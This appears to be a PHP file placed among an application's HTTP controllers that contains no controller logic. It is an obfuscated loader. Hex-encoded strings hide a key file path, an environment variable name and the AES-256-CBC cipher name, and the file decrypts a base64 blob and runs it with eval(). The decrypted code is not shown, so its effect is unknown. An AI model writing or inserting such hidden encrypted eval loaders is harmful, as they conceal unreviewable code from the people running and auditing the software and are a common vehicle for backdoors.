<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('anuNNmYy63gMongeTAfi0g==');

$c=base64_decode(

'KZblf5C2tI9VJDkBZKbo+ayrvfisvsGMBkODNoGWeelwfvCvo0jDFUBkphSUxoxDpACbj80UZI1f' .
'XroPQr56m1lCeqgEnXk2hHiYrz0930Mkq9YqqZ29L4CXn+1fe3XpXdXlgYN/Y2cuLDfNSJcb4kAF' .
'dhni9RZVLykOEmodaau3JlPUa3+AsopUfNr4KUwdZA89vnlJi2cKIhv+SFeygNtZwtA2DzVQKsx/' .
'USFHRALEvxnpoY2B1uJ86FhLVzsv'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

